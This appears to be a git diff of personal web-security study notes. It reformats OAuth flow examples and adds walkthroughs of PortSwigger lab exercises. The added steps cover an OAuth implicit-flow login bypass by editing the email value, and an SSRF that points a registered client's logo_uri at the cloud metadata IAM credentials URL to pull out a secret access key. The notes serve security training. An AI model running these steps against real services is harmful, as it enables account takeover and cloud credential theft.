@@ -4824,7 +4824,7 @@ Response: Communication timed out. (chunked size is 5)
 	    "expires_in": 3600,
 	    "scope": "openid profile",
 	    …
-	}
+      }
       ```
     - API call
       ```
@@ -4838,7 +4838,7 @@ Response: Communication timed out. (chunked size is 5)
 	    "username":"carlos",
 	    "email":"carlos@carlos-montoya.net",
 	    …
-	}
+      }
       ```
     ![Authorization code grant type](https://portswigger.net/web-security/images/oauth-authorization-code-flow.jpg)
   - implicit grant type
@@ -4879,9 +4879,9 @@ Response: Communication timed out. (chunked size is 5)
       {
 	    "username":"carlos",
 	    "email":"carlos@carlos-montoya.net"
-	}
+      }
       ```
-    ![Implicit grant type](https://portswigger.net/web-security/images/oauth-implicit-flow.jpg))
+      ![Implicit grant type](https://portswigger.net/web-security/images/oauth-implicit-flow.jpg)
 
 **OpenID Connect**  
 [OpenID Connect Authorization Code Flow](https://curity.io/resources/learn/openid-code-flow/)
@@ -4906,7 +4906,7 @@ Response: Communication timed out. (chunked size is 5)
 ![SAML 2.0 Assertion flow](https://developer.okta.com/img/authorization/oauth-saml2-assertion-grant-flow.png)
 
 ### OAuth Authentication Lab
-- Authentication bypass via OAuth implicit flow
+- **Authentication bypass via OAuth implicit flow**
   - an attacker to log in to other users' accounts without knowing their password
   - traffic
     ```
@@ -4924,10 +4924,74 @@ Response: Communication timed out. (chunked size is 5)
     Host: 0aa900ca04d1a64dc79b634900790017.web-security-academy.net
     {"email":"wiener@hotdog.com","username":"wiener","token":"V4-AjsLZ2zep91RbNL7_IJc4wrCDRksGBfxbIVFpZj-"}
     ```
-  - POST /authenticate > send to repeater > modify the email value "carlos@carlos-montoya.net" > show response in browser > carlos login
-- SSRF via OpenID dynamic client registration
+  - `POST /authenticate` > send to repeater > **modify the email value "carlos@carlos-montoya.net"** > show response in browser > carlos login
+- **SSRF via OpenID** dynamic client registration
   - This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.
-  - 
+  - craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's
+  - Login your social media account (wiener:peter)
+    ```
+    GET /auth
+    Host: oauth-0af6002e04f0ccd7831d9a45022500fe.oauth-server.net
+    ```
+  - Browse to https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration  
+    Response: registration_endpoint: "https://oauth-0af6002e04…0fe.oauth-server.net/reg"
+  - Register attacker's client application with the OAuth service > registered successfully without any authentication
+    ```
+    POST /reg HTTP/1.1
+    Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+    Content-Type: application/json
+
+	{
+	    "redirect_uris" : [
+	        "https://example.com"
+	    ]
+	}
+
+    Response
+    HTTP/2 201 Created
+    "client_id":"jUuoV0RvnsftsJG1ZzgWd"
+    "client_secret":"2uEsNzM74iAZjXhcTZAIPT-UXUIYt1L8u-J4NhcLdlgvsmtxUlYtCbZChqlKtpdYlr-h5zT0RL_164xjIzaoZw",
+    "redirect_uris":["https://example.com"],
+    ```
+  - Audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo  
+    `GET /client/xw1lwkkj5l17ungpw9856/logo`
+  - Add the "logo_uri" property in "Reg" endpoint  
+    ```
+    POST /reg HTTP/1.1
+    Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+    Content-Type: application/json
+
+	{   
+	    "redirect_uris" : [
+	        "https://example.com"
+	    ],
+	    "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
+	}
+
+    Response
+    HTTP/2 201 Created
+    "client_id":"pTwOvvgA-X5-LqLrXbwnx",
+    "client_secret":"q0_z3jz44_sLlPFgGxd5lUgvVGTRum3yJjiSpvJc964s3Fs2Fi5G5dk8ei0rgbLN7Pf-b5NKfQe29Knj02kfYw",
+    "logo_uri":"https://orj9fhcw6cqi9msw7sgg3e6jsay1mtai.oastify.com",
+    "redirect_uris":["https://example.com"],
+    ```
+  - GET /client/CLIENT-ID/logo > repeater > replace the client-id in the path
+  - Go to the Collaborator tab dialog and check for any new interactions  
+  - **Replace the logo_uri with the IAM URL**
+    ```
+    POST /reg
+	{
+	    "redirect_uris" : [
+	        "https://example.com"
+	    ],
+	    "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+	}
+
+    Response
+    "client_id":"x_6zANodKfYG9Bt4N4tWJ",
+    ``` 
+  - `GET /client/CLIENT-ID/logo` request > repeater > **replace the client-id in the path**  
+    Response:  "SecretAccessKey" : "h93ebR3rsw8vL3feotaGS33UxcTl48WHkyI74e5L"
 - ddd
 - ddd
 - ddd
